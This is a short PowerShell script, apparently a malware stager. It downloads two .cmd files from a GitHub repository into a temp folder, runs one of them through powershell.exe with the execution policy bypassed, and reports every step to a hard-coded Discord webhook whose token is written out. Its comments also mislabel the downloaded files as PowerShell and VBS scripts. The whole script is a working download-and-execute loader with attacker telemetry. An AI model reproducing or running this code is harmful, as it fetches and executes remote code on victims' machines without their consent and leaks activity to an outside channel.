# Define URLs and paths
$winURL = "https://github.com/invisibleghostshell-ux/last/raw/main/win.cmd"
$ps1URL = "https://github.com/invisibleghostshell-ux/last/raw/main/setup.cmd"
$rootPath = "$env:TEMP\ZZ\"
$ps1Path = "$rootPath\setup.cmd"
$winPath = "$rootPath\win.cmd"
$webhookURL = "https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
$intWait = 5000

# Function to send output to Discord
function SendToDiscord($message) {
    $body = @{
        content = $message
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $webhookURL -Method Post -Body $body -ContentType 'application/json'
}

# Function to download files
function DownloadFile($url, $localFile) {
    Invoke-WebRequest -Uri $url -OutFile $localFile
    if ($?) {
        SendToDiscord "Downloaded: $url"
    } else {
        SendToDiscord "Failed to download: $url"
    }
}

# Create root folder if it doesn't exist
if (-not (Test-Path -Path $rootPath)) {
    New-Item -ItemType Directory -Path $rootPath -Force
    if ($?) {
        SendToDiscord "Created root folder: $rootPath"
    } else {
        SendToDiscord "Failed to create root folder: $rootPath"
    }
}

# Download PowerShell script if it does not exist
if (-not (Test-Path -Path $ps1Path)) {
    SendToDiscord "Starting download of PowerShell script..."
    DownloadFile -url $ps1URL -localFile $ps1Path
}

# Download VBS script if it does not exist
if (-not (Test-Path -Path $winPath)) {
    SendToDiscord "Starting download of VBS script..."
    DownloadFile -url $winURL -localFile $winPath
}

# Wait for a few seconds
SendToDiscord "Download completed. Waiting for 5 seconds..."
Start-Sleep -Seconds 5

# Execute the PowerShell script
if (Test-Path -Path $ps1Path) {
    SendToDiscord "Executing PowerShell script..."
    try {
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$ps1Path`"" -Wait
        SendToDiscord "Executed: $ps1Path"
    } catch {
        SendToDiscord "Failed to execute: $ps1Path"
    }
}
